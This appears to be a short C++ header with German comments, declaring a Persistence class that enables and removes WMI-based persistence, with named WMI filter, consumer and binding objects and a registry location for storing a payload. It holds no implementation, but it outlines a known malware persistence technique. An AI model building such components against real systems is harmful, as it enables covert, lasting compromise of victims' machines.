#ifndef PERSISTENCE_H
#define PERSISTENCE_H

#include <windows.h>

class Persistence {
public:
    // Richtet die WMI-Persistenz ein.
    static HRESULT Enable();

    // Entfernt die WMI-Persistenz sauber.
    static HRESULT Disable();

private:
    // Name für die WMI-Objekte, um sie wiederzufinden.
    static const wchar_t* FILTER_NAME;
    static const wchar_t* CONSUMER_NAME;
    static const wchar_t* BINDING_NAME;

    // Registry-Pfad zum Speichern des Payloads.
    static const wchar_t* REG_SUBKEY;
    static const wchar_t* REG_VALUE_NAME;
};

#endif // PERSISTENCE_H 